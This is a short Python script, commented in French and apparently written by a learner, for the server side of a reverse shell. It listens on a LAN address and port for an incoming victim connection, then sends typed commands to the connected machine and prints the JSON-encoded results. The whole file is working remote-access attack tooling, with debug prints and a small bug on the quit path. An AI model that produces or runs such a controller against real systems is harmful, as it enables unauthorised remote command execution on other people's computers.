#!/usr/bin/python3

import socket
import json

def reliable_send(data):
    json_data = json.dumps(data)
    print("json_data -> {}".format(json_data))
    target.send(json_data.encode())


def reliable_recv():
    data = ""
    while True:
        print("je suis un caca pomme")
        try:
            data = data + target.recv(1024).decode('utf-8')
            return json.loads(data)
            print("je suis une pomme")
            break
        except ValueError:
            print("erreur")
            continue

def shell():
    while True:
        command = input("Shell#~{}:".format(ip))
        # si on tape q dans l'invite de commande on quitte le programme
        if command == 'q':
            reliable_send(command.encode())
            s.close()
            break
        else:
            # pour convertir en bites
            #print(type(command.encode()))
            #print(command.encode())
            target.send(command.encode())
            message = reliable_recv()
            print(message)

def server():
    global s
    global ip
    global target
    # on cree lobjet pour la connection en IPV4 et on veut verifier que ce sont bien des request TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # l'ip est le port sur lequel nous ecountons au niveau du server
    s.bind(("192.168.0.45", 54321))
    # on accepte 5 connexions en meme temps
    s.listen(5)

    print("[+] Listening For Incoming Connections")

    target, ip = s.accept()
    print("[+] Connection Established From {}".format(ip))

if __name__ == '__main__':
    server()
    shell()
